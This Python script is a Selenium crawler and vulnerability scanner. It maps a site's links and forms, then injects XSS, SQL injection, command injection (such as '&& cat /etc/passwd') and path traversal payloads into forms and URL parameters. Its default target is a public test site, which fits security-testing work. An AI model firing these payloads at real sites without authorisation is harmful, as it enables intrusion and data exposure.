#!/usr/bin/env python3
"""
Intelligent Visual Web Crawler & Penetration Tester

This tool intelligently crawls websites, discovers features, and performs 
real-time visual penetration testing based on what it finds.
"""

import asyncio
import sys
import re
import json
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from urllib.parse import urljoin, urlparse
import requests
import time

class IntelligentWebCrawler:
    def __init__(self):
        self.driver = None
        self.visited_urls = set()
        self.discovered_features = {
            'forms': [],
            'links': [],
            'inputs': [],
            'cookies': [],
            'headers': {},
            'vulnerabilities': []
        }
        
    async def start_browser(self):
        """Start Chrome browser in visible mode"""
        chrome_options = Options()
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        
        print("🌐 Chrome browser started - watch intelligent crawling!")
        
    async def intelligent_crawl_and_test(self, target_url):
        """Perform intelligent crawling and testing"""
        
        print(f"\n🕷️ INTELLIGENT WEB CRAWLER & PENETRATION TESTER")
        print(f"🎯 Target: {target_url}")
        print(f"🧠 AI-driven feature discovery and testing...")
        
        await self.start_browser()
        
        # Phase 1: Initial reconnaissance and feature discovery
        print(f"\n🔍 Phase 1: Intelligent Feature Discovery...")
        await self.discover_features(target_url)
        
        # Phase 2: Follow discovered links and analyze
        print(f"\n🔗 Phase 2: Following Discovered Links...")
        await self.explore_discovered_links()
        
        # Phase 3: Test discovered forms and inputs
        print(f"\n📝 Phase 3: Testing Forms and Input Fields...")
        await self.test_discovered_forms()
        
        # Phase 4: Tamper with requests and parameters
        print(f"\n🛠️ Phase 4: Request Tampering and Parameter Testing...")
        await self.tamper_with_requests(target_url)
        
        # Phase 5: Analyze and report findings
        print(f"\n🧠 Phase 5: AI Analysis of Discovered Features...")
        await self.analyze_findings()
        
        # Keep browser open for inspection
        print(f"\n🎉 Intelligent crawling completed!")
        print(f"🖥️ Browser stays open - inspect discovered features")
        print(f"📋 Press Enter to close...")
        input()
        
        self.driver.quit()

    async def discover_features(self, url):
        """Discover all features on the current page"""
        
        print(f"  📡 Loading and analyzing: {url}")
        self.driver.get(url)
        await asyncio.sleep(3)
        
        # Get page title and basic info
        title = self.driver.title
        current_url = self.driver.current_url
        print(f"  📋 Page: {title}")
        print(f"  🔗 URL: {current_url}")
        
        # Discover all links
        links = self.driver.find_elements(By.TAG_NAME, "a")
        print(f"  🔗 Found {len(links)} links")
        
        for link in links[:10]:  # Analyze first 10 links
            href = link.get_attribute("href")
            text = link.text.strip()
            if href and href not in self.visited_urls:
                self.discovered_features['links'].append({
                    'url': href,
                    'text': text,
                    'page_found': current_url
                })
                print(f"    • {text[:30]} → {href}")
        
        # Discover all forms
        forms = self.driver.find_elements(By.TAG_NAME, "form")
        print(f"  📝 Found {len(forms)} forms")
        
        for i, form in enumerate(forms):
            action = form.get_attribute("action") or current_url
            method = form.get_attribute("method") or "GET"
            inputs = form.find_elements(By.TAG_NAME, "input")
            
            form_data = {
                'action': action,
                'method': method,
                'inputs': [],
                'page_found': current_url
            }
            
            print(f"    📋 Form {i+1}: {method} → {action}")
            
            for inp in inputs:
                input_type = inp.get_attribute("type")
                input_name = inp.get_attribute("name")
                input_value = inp.get_attribute("value")
                
                form_data['inputs'].append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
                
                print(f"      • {input_type}: {input_name} = '{input_value}'")
            
            self.discovered_features['forms'].append(form_data)
        
        # Discover parameters in current URL
        if '?' in current_url:
            params = current_url.split('?')[1]
            print(f"  🔧 URL Parameters: {params}")
            
        # Check cookies
        cookies = self.driver.get_cookies()
        if cookies:
            print(f"  🍪 Found {len(cookies)} cookies")
            for cookie in cookies:
                print(f"    • {cookie['name']} = {cookie['value'][:20]}...")
        
        self.visited_urls.add(current_url)

    async def explore_discovered_links(self):
        """Follow and analyze discovered links"""
        
        print(f"  🕷️ Exploring {len(self.discovered_features['links'])} discovered links...")
        
        for i, link_info in enumerate(self.discovered_features['links'][:5]):  # Test first 5 links
            url = link_info['url']
            text = link_info['text']
            
            print(f"  🔗 Link {i+1}: {text} → {url}")
            
            try:
                if url.startswith('http') and url not in self.visited_urls:
                    self.driver.get(url)
                    await asyncio.sleep(2)
                    
                    # Quick analysis of the new page
                    page_title = self.driver.title
                    page_source = self.driver.page_source.lower()
                    
                    print(f"    📋 Loaded: {page_title}")
                    
                    # Look for interesting keywords
                    interesting = []
                    keywords = ['login', 'admin', 'password', 'error', 'database', 'sql']
                    
                    for keyword in keywords:
                        if keyword in page_source:
                            interesting.append(keyword)
                    
                    if interesting:
                        print(f"    🚨 Interesting content: {', '.join(interesting)}")
                    
                    # Check for forms on this page too
                    forms = self.driver.find_elements(By.TAG_NAME, "form")
                    if forms:
                        print(f"    📝 Found {len(forms)} forms on this page")
                        
                    self.visited_urls.add(url)
                    
            except Exception as e:
                print(f"    ❌ Error loading {url}: {e}")

    async def test_discovered_forms(self):
        """Test all discovered forms with various payloads"""
        
        print(f"  📝 Testing {len(self.discovered_features['forms'])} discovered forms...")
        
        payloads = {
            'xss': ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "<img src=x onerror=alert('XSS')>"],
            'sql': ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--", "1' OR 1=1#"],
            'command': ["; ls -la", "| whoami", "&& cat /etc/passwd"],
            'path_traversal': ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]
        }
        
        for form_info in self.discovered_features['forms']:
            action = form_info['action']
            method = form_info['method']
            inputs = form_info['inputs']
            
            print(f"  🎯 Testing form: {method} {action}")
            
            # Navigate to the form page
            page_url = form_info['page_found']
            self.driver.get(page_url)
            await asyncio.sleep(2)
            
            # Find the form again
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            if forms:
                form = forms[0]  # Test first form
                
                # Test XSS payloads
                for payload_type, payload_list in payloads.items():
                    print(f"    🚨 Testing {payload_type} payloads...")
                    
                    for payload in payload_list[:2]:  # Test first 2 payloads of each type
                        try:
                            # Fill form inputs with payload
                            form_inputs = form.find_elements(By.TAG_NAME, "input")
                            
                            for inp in form_inputs:
                                input_type = inp.get_attribute("type")
                                if input_type in ['text', 'search', 'email', 'url']:
                                    inp.clear()
                                    inp.send_keys(payload)
                                    print(f"      💉 Injected {payload_type}: {payload[:30]}...")
                            
                            # Submit form
                            submit_button = form.find_element(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                            if submit_button:
                                submit_button.click()
                                await asyncio.sleep(3)
                                
                                # Analyze response
                                page_source = self.driver.page_source.lower()
                                current_url = self.driver.current_url
                                
                                # Check for vulnerabilities
                                if payload_type == 'xss':
                                    # Check for XSS
                                    try:
                                        alert = self.driver.switch_to.alert
                                        if alert:
                                            print(f"      🚨 XSS VULNERABILITY CONFIRMED!")
                                            alert.accept()
                                            self.discovered_features['vulnerabilities'].append({
                                                'type': 'XSS',
                                                'payload': payload,
                                                'form': action,
                                                'page': page_url
                                            })
                                    except:
                                        pass
                                
                                elif payload_type == 'sql':
                                    # Check for SQL errors
                                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'warning: mysql']
                                    for error in sql_errors:
                                        if error in page_source:
                                            print(f"      🚨 SQL INJECTION VULNERABILITY!")
                                            self.discovered_features['vulnerabilities'].append({
                                                'type': 'SQL Injection',
                                                'payload': payload,
                                                'error': error,
                                                'form': action,
                                                'page': page_url
                                            })
                                
                                # Go back to form page
                                self.driver.get(page_url)
                                await asyncio.sleep(1)
                                
                        except Exception as e:
                            print(f"      ⚠️ Error testing payload: {e}")

    async def tamper_with_requests(self, base_url):
        """Tamper with URL parameters and analyze responses"""
        
        print(f"  🛠️ Tampering with requests and parameters...")
        
        # Test common parameters
        common_params = ['id', 'user', 'page', 'file', 'search', 'q', 'category']
        tamper_payloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>", 
            "../../../etc/passwd",
            "1 UNION SELECT NULL",
            "; ls -la"
        ]
        
        for param in common_params:
            print(f"    🔧 Testing parameter: {param}")
            
            for payload in tamper_payloads[:3]:  # Test first 3 payloads
                test_url = f"{base_url}?{param}={payload}"
                print(f"      🎯 Testing: {param}={payload[:20]}...")
                
                try:
                    self.driver.get(test_url)
                    await asyncio.sleep(2)
                    
                    page_source = self.driver.page_source.lower()
                    
                    # Look for interesting responses
                    if 'error' in page_source or 'warning' in page_source:
                        print(f"      🚨 Potential vulnerability - error in response!")
                    
                    if 'root:' in page_source or '/etc/passwd' in page_source:
                        print(f"      🚨 PATH TRAVERSAL VULNERABILITY!")
                        
                    if payload.lower() in page_source:
                        print(f"      🚨 PAYLOAD REFLECTED - Potential XSS!")
                        
                except Exception as e:
                    print(f"      ⚠️ Error testing {param}: {e}")

    async def analyze_findings(self):
        """Analyze all discovered features and vulnerabilities"""
        
        print(f"  🧠 Analyzing discovered features...")
        
        print(f"\n📊 DISCOVERY SUMMARY:")
        print(f"  🔗 Links discovered: {len(self.discovered_features['links'])}")
        print(f"  📝 Forms discovered: {len(self.discovered_features['forms'])}")
        print(f"  🚨 Vulnerabilities found: {len(self.discovered_features['vulnerabilities'])}")
        print(f"  📄 Pages visited: {len(self.visited_urls)}")
        
        if self.discovered_features['vulnerabilities']:
            print(f"\n🚨 VULNERABILITIES FOUND:")
            for vuln in self.discovered_features['vulnerabilities']:
                print(f"  • {vuln['type']}: {vuln['payload']} on {vuln['page']}")
        
        if self.discovered_features['forms']:
            print(f"\n📝 INTERESTING FORMS:")
            for form in self.discovered_features['forms']:
                print(f"  • {form['method']} {form['action']} ({len(form['inputs'])} inputs)")
        
        print(f"\n🎯 RECOMMENDATIONS:")
        print(f"  1. Review all discovered vulnerabilities")
        print(f"  2. Test remaining forms manually")
        print(f"  3. Implement input validation and sanitization")
        print(f"  4. Use parameterized queries for database interactions")

async def main():
    """Main function"""
    import sys
    
    if len(sys.argv) < 2:
        target_url = "http://testphp.vulnweb.com/"
        print(f"No URL provided, using default: {target_url}")
    else:
        target_url = sys.argv[1]
    
    crawler = IntelligentWebCrawler()
    await crawler.intelligent_crawl_and_test(target_url)

if __name__ == "__main__":
    asyncio.run(main())
